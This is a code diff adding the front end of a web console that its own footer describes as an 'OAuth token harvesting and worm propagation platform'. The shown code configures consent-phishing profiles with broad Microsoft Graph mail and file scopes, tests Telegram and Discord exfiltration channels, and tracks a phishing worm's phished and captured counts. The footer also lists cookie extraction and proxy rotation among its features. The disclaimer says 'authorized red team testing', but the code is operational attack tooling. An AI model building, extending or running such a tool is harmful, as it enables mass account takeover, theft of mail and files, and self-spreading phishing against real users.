+        badge.classList.add('badge-info', 'badge-spinner');
+        badge.textContent = 'RUNNING';
+        resultCard.style.display = 'block';
+        document.getElementById('exfilTestResultBody').innerHTML = '<pre style="white-space: pre-wrap; word-break: break-word;">Running exfil test... please wait.</pre>';
+
+        const response = await fetch('/api/exfil/test', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        });
+        const data = await response.json();
+        badge.classList.remove('badge-spinner');
+
+        if (response.ok && data.success) {
+            resultCard.classList.add('test-result-success');
+            badge.classList.remove('badge-info', 'badge-spinner');
+            badge.classList.add('badge-success');
+            badge.textContent = 'PASS';
+            showStatus('✅ Exfil test succeeded!', 'success');
+            addLog('Exfil test succeeded', 'success');
+            document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">PASS\n${JSON.stringify(data.results, null, 2)}</pre>`;
+        } else {
+            resultCard.classList.add('test-result-failure');
+            badge.classList.remove('badge-info', 'badge-spinner');
+            badge.classList.add('badge-danger');
+            badge.textContent = 'FAIL';
+            const details = data.error || data.results || data;
+            showStatus('❌ Exfil test failed: ' + (data.error || JSON.stringify(data.results || data)), 'error');
+            addLog('Exfil test failed: ' + (data.error || JSON.stringify(data.results || data)), 'danger');
+            document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">FAIL\n${JSON.stringify(details, null, 2)}</pre>`;
+        }
+    } catch (e) {
+        showStatus('❌ Error testing exfil settings: ' + e.message, 'error');
+        addLog('Error testing exfil settings: ' + e.message, 'danger');
+        const resultCard = document.getElementById('exfilTestResult');
+        const badge = document.getElementById('exfilTestBadge');
+        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
+        resultCard.classList.add('test-result-failure');
+        badge.classList.remove('badge-success', 'badge-danger', 'badge-info', 'badge-spinner');
+        badge.classList.add('badge-danger');
+        badge.textContent = 'FAIL';
+        resultCard.style.display = 'block';
+        document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">${e.message}</pre>`;
+    } finally {
+        const btn = event?.target || document.getElementById('testExfilSettingsBtn');
+        if (btn) {
+            btn.disabled = false;
+            btn.textContent = '🧪 Test Exfil Settings';
+        }
+    }
+}
+
+async function testWebhookChannel(event, channelType) {
+    try {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.textContent = `⏳ Testing ${channelType}...`;
+
+        const resultCard = document.getElementById('exfilTestResult');
+        const badge = document.getElementById('exfilTestBadge');
+        const body = document.getElementById('exfilTestResultBody');
+        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
+        resultCard.classList.add('test-result-running');
+        badge.classList.remove('badge-success', 'badge-danger', 'badge-info');
+        badge.classList.add('badge-info', 'badge-spinner');
+        badge.textContent = 'RUNNING';
+        resultCard.style.display = 'block';
+        body.innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">Running ${channelType} webhook test... please wait.</pre>`;
+
+        const response = await fetch('/api/exfil/test', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ channel_type: channelType })
+        });
+        const data = await response.json();
+        badge.classList.remove('badge-spinner');
+
+        if (response.ok && data.success) {
+            resultCard.classList.add('test-result-success');
+            badge.classList.remove('badge-info', 'badge-spinner');
+            badge.classList.add('badge-success');
+            badge.textContent = 'PASS';
+            showStatus(`✅ ${channelType.charAt(0).toUpperCase() + channelType.slice(1)} webhook test succeeded!`, 'success');
+            addLog(`${channelType} webhook test succeeded`, 'success');
+            body.innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">PASS\n${JSON.stringify(data.results, null, 2)}</pre>`;
+        } else {
+            resultCard.classList.add('test-result-failure');
+            badge.classList.remove('badge-info', 'badge-spinner');
+            badge.classList.add('badge-danger');
+            badge.textContent = 'FAIL';
+            const details = data.error || data.results || data;
+            showStatus(`❌ ${channelType.charAt(0).toUpperCase() + channelType.slice(1)} webhook test failed: ${data.error || JSON.stringify(data.results || data)}`, 'error');
+            addLog(`${channelType} webhook test failed: ${data.error || JSON.stringify(data.results || data)}`, 'danger');
+            body.innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">FAIL\n${JSON.stringify(details, null, 2)}</pre>`;
+        }
+    } catch (e) {
+        showStatus(`❌ Error testing ${channelType} webhook: ${e.message}`, 'error');
+        addLog(`Error testing ${channelType} webhook: ${e.message}`, 'danger');
+        const resultCard = document.getElementById('exfilTestResult');
+        const badge = document.getElementById('exfilTestBadge');
+        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
+        resultCard.classList.add('test-result-failure');
+        badge.classList.remove('badge-success', 'badge-danger', 'badge-info', 'badge-spinner');
+        badge.classList.add('badge-danger');
+        badge.textContent = 'FAIL';
+        document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">${e.message}</pre>`;
+    } finally {
+        const btn = event?.target || document.getElementById(`test${channelType.charAt(0).toUpperCase() + channelType.slice(1)}WebhookBtn`);
+        if (btn) {
+            btn.disabled = false;
+            btn.textContent = channelType === 'telegram' ? '📨 Test Telegram' : '💬 Test Discord';
+        }
+    }
+}
+
+async function validateExfilSettings(event) {
+    try {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.textContent = '⏳ Validating...';
+
+        const resultCard = document.getElementById('exfilTestResult');
+        const badge = document.getElementById('exfilTestBadge');
+        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
+        resultCard.classList.add('test-result-running');
+        badge.classList.remove('badge-success', 'badge-danger', 'badge-info');
+        badge.classList.add('badge-info', 'badge-spinner');
+        badge.textContent = 'RUNNING';
+        resultCard.style.display = 'block';
+        document.getElementById('exfilTestResultBody').innerHTML = '<pre style="white-space: pre-wrap; word-break: break-word;">Validating exfil settings... please wait.</pre>';
+
+        const response = await fetch('/api/exfil/validate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        });
+        const data = await response.json();
+        badge.classList.remove('badge-spinner');
+
+        if (response.ok && data.valid) {
+            resultCard.classList.add('test-result-success');
+            badge.classList.remove('badge-info', 'badge-spinner');
+            badge.classList.add('badge-success');
+            badge.textContent = 'VALID';
+            showStatus('✅ Exfil settings validated!', 'success');
+            addLog('Exfil settings validated', 'success');
+            document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">VALID\n${JSON.stringify(data.results, null, 2)}</pre>`;
+        } else {
+            resultCard.classList.add('test-result-failure');
+            badge.classList.remove('badge-info', 'badge-spinner');
+            badge.classList.add('badge-danger');
+            badge.textContent = 'INVALID';
+            const details = extractValidationDetails(data);
+            showStatus('❌ Exfil validation failed: ' + details.summary, 'error');
+            addLog('Exfil validation failed: ' + details.summary, 'danger');
+            document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">INVALID\n${details.full}</pre>`;
+        }
+    } catch (e) {
+        showStatus('❌ Error validating exfil settings: ' + e.message, 'error');
+        addLog('Error validating exfil settings: ' + e.message, 'danger');
+        const resultCard = document.getElementById('exfilTestResult');
+        const badge = document.getElementById('exfilTestBadge');
+        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
+        resultCard.classList.add('test-result-failure');
+        badge.classList.remove('badge-success', 'badge-danger', 'badge-info', 'badge-spinner');
+        badge.classList.add('badge-danger');
+        badge.textContent = 'FAIL';
+        resultCard.style.display = 'block';
+        document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">${e.message}</pre>`;
+    } finally {
+        const btn = event?.target || document.getElementById('validateExfilSettingsBtn');
+        if (btn) {
+            btn.disabled = false;
+            btn.textContent = '✅ Validate Exfil Settings';
+        }
+    }
+}
+
+
+// ==================== PROFILE MANAGEMENT ====================
+async function saveCurrentProfile() {
+    const name = document.getElementById('newProfileName').value;
+    if (!name) {
+        showStatus('Please enter a profile name', 'warning');
+        return;
+    }
+    
+    const config = {
+        client_id: document.getElementById('clientId').value,
+        tenant: document.getElementById('tenant').value,
+        scope: document.getElementById('scope').value,
+        max_endpoints: parseInt(document.getElementById('maxEndpoints').value),
+        refresh_token: document.getElementById('refreshToken').checked,
+        detect_ca: document.getElementById('detectCA').checked
+    };
+    
+    try {
+        const response = await fetch('/api/config/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name, config })
+        });
+        if (response.ok) {
+            showStatus(`Profile "${name}" saved successfully`, 'success');
+            refreshProfilesList();
+            document.getElementById('newProfileName').value = '';
+        } else {
+            showStatus('Failed to save profile', 'error');
+        }
+    } catch (e) {
+        showStatus('Error saving profile: ' + e.message, 'error');
+    }
+}
+
+async function quickSaveProfile() {
+    const name = prompt('Enter profile name:');
+    if (name) {
+        document.getElementById('newProfileName').value = name;
+        await saveCurrentProfile();
+    }
+}
+
+async function loadDefaultConfig() {
+    document.getElementById('clientId').value = '';
+    document.getElementById('tenant').value = 'common';
+    document.getElementById('scope').value = 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/User.Read openid offline_access profile';
+    document.getElementById('maxEndpoints').value = '4';
+    document.getElementById('refreshToken').checked = true;
+    document.getElementById('detectCA').checked = true;
+    addLog('Loaded default configuration', 'info');
+}
+
+async function refreshProfilesList() {
+    try {
+        const response = await fetch('/api/config/list');
+        const data = await response.json();
+        const container = document.getElementById('profilesList');
+        
+        if (!data.configs || Object.keys(data.configs).length === 0) {
+            container.innerHTML = '<p class="text-muted text-center" style="padding: 20px;">No saved profiles</p>';
+            return;
+        }
+        
+        container.innerHTML = '';
+        for (const [name, config] of Object.entries(data.configs)) {
+            container.innerHTML += `
+                <div class="profile-item">
+                    <div>
+                        <strong>${name}</strong><br>
+                        <small class="text-muted">Client: ${config.client_id ? config.client_id.substring(0, 30) + '...' : 'Not set'}</small>
+                    </div>
+                    <div class="flex">
+                        <button class="btn btn-secondary" onclick="loadProfile('${name}')">Load</button>
+                        <button class="btn btn-danger" onclick="deleteProfile('${name}')">Delete</button>
+                    </div>
+                </div>
+            `;
+        }
+    } catch (e) {
+        console.log('Failed to refresh profiles list');
+    }
+}
+
+async function loadProfile(name) {
+    try {
+        const response = await fetch(`/api/config/load/${name}`);
+        const config = await response.json();
+        
+        document.getElementById('clientId').value = config.client_id || '';
+        document.getElementById('tenant').value = config.tenant || 'common';
+        document.getElementById('scope').value = config.scope || '';
+        document.getElementById('maxEndpoints').value = config.max_endpoints || 4;
+        document.getElementById('refreshToken').checked = config.refresh_token !== false;
+        document.getElementById('detectCA').checked = config.detect_ca !== false;
+        
+        showStatus(`Loaded profile "${name}"`, 'success');
+        addLog(`Loaded profile: ${name}`, 'success');
+    } catch (e) {
+        showStatus('Failed to load profile', 'error');
+    }
+}
+
+async function deleteProfile(name) {
+    if (!confirm(`Delete profile "${name}"?`)) return;
+    
+    try {
+        const response = await fetch(`/api/config/delete/${name}`, { method: 'DELETE' });
+        if (response.ok) {
+            showStatus(`Profile "${name}" deleted`, 'success');
+            refreshProfilesList();
+        } else {
+            showStatus('Failed to delete profile', 'error');
+        }
+    } catch (e) {
+        showStatus('Error deleting profile', 'error');
+    }
+}
+
+async function exportAllProfiles() {
+    try {
+        const response = await fetch('/api/config/export');
+        const data = await response.json();
+        downloadFile(JSON.stringify(data, null, 2), `profiles_${Date.now()}.json`, 'application/json');
+        addLog('Profiles exported', 'success');
+    } catch (e) {
+        showStatus('Failed to export profiles', 'error');
+    }
+}
+
+async function importProfiles() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'application/json';
+    input.onchange = async (e) => {
+        const file = e.target.files[0];
+        const text = await file.text();
+        const configs = JSON.parse(text);
+        
+        const response = await fetch('/api/config/import', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ configs })
+        });
+        
+        if (response.ok) {
+            showStatus(`Imported ${Object.keys(configs).length} profiles`, 'success');
+            refreshProfilesList();
+        } else {
+            showStatus('Failed to import profiles', 'error');
+        }
+    };
+    input.click();
+}
+
+async function confirmClearOverrides() {
+    if (!confirm('Clear runtime overrides and restore .env defaults? This will remove any settings you applied from the dashboard.')) return;
+    try {
+        const resp = await fetch('/api/runtime-overrides/clear', { method: 'POST' });
+        const data = await resp.json();
+        if (resp.ok && data.success) {
+            showStatus('Runtime overrides cleared. Refreshing page...', 'success');
+            addLog('Runtime overrides cleared', 'success');
+            setTimeout(() => location.reload(), 800);
+        } else {
+            showStatus('Failed to clear overrides: ' + (data.error || 'unknown'), 'error');
+        }
+    } catch (e) {
+        showStatus('Error clearing overrides: ' + e.message, 'error');
+    }
+}
+
+// ==================== UI HELPERS ====================
+function clearOutput() {
+    document.getElementById('logContainer').innerHTML = '';
+    document.getElementById('resultsCard').classList.add('hidden');
+    document.getElementById('captureCard').classList.add('hidden');
+    if (eventSource) eventSource.close();
+    currentSessionId = null;
+    addLog('Output cleared', 'info');
+}
+
+function toggleTheme() {
+    const root = document.documentElement;
+    const isDark = getComputedStyle(root).getPropertyValue('--bg-primary').trim() === '#0a0c10';
+    
+    if (isDark) {
+        root.style.setProperty('--bg-primary', '#ffffff');
+        root.style.setProperty('--bg-secondary', '#f6f8fa');
+        root.style.setProperty('--bg-tertiary', '#ffffff');
+        root.style.setProperty('--text-primary', '#1f2328');
+        root.style.setProperty('--text-secondary', '#656d76');
+        root.style.setProperty('--border', '#d0d7de');
+    } else {
+        root.style.setProperty('--bg-primary', '#0a0c10');
+        root.style.setProperty('--bg-secondary', '#161b22');
+        root.style.setProperty('--bg-tertiary', '#0d1117');
+        root.style.setProperty('--text-primary', '#ffffff');
+        root.style.setProperty('--text-secondary', '#8b949e');
+        root.style.setProperty('--border', '#30363d');
+    }
+}
+
+function openSettingsModal() {
+    document.getElementById('settingsModal').classList.add('active');
+    loadSettings();
+}
+
+function closeSettingsModal() {
+    document.getElementById('settingsModal').classList.remove('active');
+}
+
+function switchTab(tabId) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelector(`[onclick="switchTab('${tabId}')"]`).classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+}
+
+// Event listeners for toggle switches
+document.getElementById('wormEnabled')?.addEventListener('change', function(e) {
+    document.getElementById('wormEnabledLabel').textContent = e.target.checked ? 'Enabled' : 'Disabled';
+});
+
+document.getElementById('playwrightEnabled')?.addEventListener('change', function(e) {
+    document.getElementById('playwrightLabel').textContent = e.target.checked ? 'Enabled' : 'Disabled';
+});
+
+// ==================== WORM FUNCTIONS ====================
+async function checkWormStatus() {
+    try {
+        const resp = await fetch('/api/worm/status');
+        const data = await resp.json();
+        const indicator = document.getElementById('wormIndicator');
+        const wormCard = document.getElementById('statWormEnabled');
+        if (indicator) {
+            if (data.enabled) {
+                indicator.className = 'badge badge-success';
+                indicator.innerHTML = `🐛 Worm: <strong>ENABLED</strong> | Phished: ${data.phished_count || 0} | Captured: ${data.captured_count || 0}`;
+            } else {
+                indicator.className = 'badge badge-warning';
+                indicator.innerHTML = '🐛 Worm: DISABLED';
+            }
+        }
+        if (wormCard) {
+            if (data.enabled) {
+                wormCard.textContent = 'ENABLED';
+                wormCard.style.color = 'var(--success)';
+            } else {
+                wormCard.textContent = 'DISABLED';
+                wormCard.style.color = 'var(--danger)';
+            }
+        }
+    } catch (e) {
+        console.error('Failed to check worm status:', e);
+    }
+}
+
+async function previewWormTemplate() {
+    const preview = document.getElementById('wormTemplatePreview');
+    const content = document.getElementById('wormTemplateContent');
+    const info = document.getElementById('wormTemplateInfo');
+    
+    if (!preview.classList.contains('hidden')) {
+        preview.classList.add('hidden');
+        return;
+    }
+    
+    content.textContent = 'Loading template...';
+    info.textContent = 'Loading...';
+    preview.classList.remove('hidden');
+    
+    try {
+        const resp = await fetch('/api/worm/template/preview');
+        if (!resp.ok) {
+            content.textContent = 'Failed to load template';
+            info.textContent = 'Error: ' + resp.statusText;
+            return;
+        }
+        
+        const data = await resp.json();
+        if (!data.success) {
+            content.textContent = 'Failed to load: ' + (data.error || 'unknown');
+            info.textContent = 'Error loading template';
+            return;
+        }
+        
+        const template = data.html_template || data.txt_template || 'No template available';
+        const templateType = data.template_type === 'html' ? '📧 HTML Email' : '📄 Plain Text';
+        const customStatus = data.has_custom_templates ? '✅ Using custom templates' : '⚠️ Using default template';
+        info.textContent = `${templateType} | ${customStatus} | Size: ${template.length} bytes`;
+
+        const renderArea = document.getElementById('wormTemplateRendered');
+        const iframe = document.getElementById('wormTemplateIframe');
+        const codeWrapper = document.getElementById('wormTemplateCodeWrapper');
+        const truncated = template.length > 1000 ? template.substring(0, 1000) + '\n\n... [truncated]' : template;
+
+        if (data.template_type === 'html' && data.html_template) {
+            renderArea.classList.remove('hidden');
+            renderArea.style.display = 'block';
+            iframe.style.display = 'block';
+            try {
+                iframe.srcdoc = template;
+            } catch (err) {
+                const blob = new Blob([template], { type: 'text/html' });
+                iframe.src = URL.createObjectURL(blob);
+            }
+            codeWrapper.classList.add('hidden');
+            codeWrapper.style.display = 'none';
+            content.textContent = '';
+        } else {
+            renderArea.classList.add('hidden');
+            renderArea.style.display = 'none';
+            iframe.style.display = 'none';
+            iframe.srcdoc = '';
+            codeWrapper.classList.remove('hidden');
+            codeWrapper.style.display = 'block';
+            content.textContent = template;
+        }
+    } catch (e) {
+        content.textContent = 'Error: ' + e.message;
+        info.textContent = 'Exception while loading';
+    }
+}
+
+async function showWormDetails() {
+    openSettingsModal();
+    switchTab('wormTab');
+    checkWormStatus();
+}
+
+// ==================== REAL-TIME STATUS POLLING ====================
+let statusPollingInterval = null;
+
+function startStatusPolling() {
+    // Poll every 10 seconds
+    statusPollingInterval = setInterval(() => {
+        checkWormStatus();
+        refreshProxyStatus();
+    }, 10000);
+    // Initial check
+    checkWormStatus();
+    refreshProxyStatus();
+}
+
+function stopStatusPolling() {
+    if (statusPollingInterval) {
+        clearInterval(statusPollingInterval);
+        statusPollingInterval = null;
+    }
+}
+
+// Start polling on page load
+document.addEventListener('DOMContentLoaded', () => {
+    startStatusPolling();
+});</script>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <h4>🔐 About</h4>
+            <p>Enterprise-grade OAuth token harvesting and worm propagation platform for authorized red team testing and security assessments.</p>
+        </div>
+        <div class="footer-section">
+            <h4>⚙️ Features</h4>
+            <ul>
+                <li>🎯 Multi-endpoint token harvesting</li>
+                <li>🐛 Autonomous worm propagation</li>
+                <li>🔄 Automatic proxy rotation</li>
+                <li>📤 Multi-channel exfiltration</li>
+                <li>🎭 Playwright-based cookie extraction</li>
+            </ul>
+        </div>
+        <div class="footer-section">
+            <h4>🛡️ Security</h4>
+            <ul>
+                <li>✅ AES-256 encryption support</li>
+                <li>✅ Token auto-refresh mechanism</li>
+                <li>✅ Conditional Access detection</li>
+                <li>✅ Session persistence & recovery</li>
+                <li>✅ Runtime configuration overrides</li>
+            </ul>
+        </div>
+        <div class="footer-section">
+            <h4>📊 Status</h4>
+            <div style="margin-top: 12px;">
+                <div class="footer-status">
+                    🟢 API: Online
+                </div>
+                <div class="footer-status" style="margin-top: 8px;">
+                    🟢 Database: Connected
+                </div>
+                <div class="footer-status" style="margin-top: 8px;">
+                    🟢 Worm Engine: Ready
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-divider"></div>
+
+    <div class="footer-bottom">
+        <div class="footer-bottom-left">
+            <span>© 2026 Red Team Console. All rights reserved.</span>
+            <span>|</span>
+            <span>v3.0.0</span>
+        </div>
+        <div class="footer-bottom-right">
+            <span>Authorized Use Only</span>
+            <span>|</span>
+            <span>Secure • Fast • Reliable</span>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
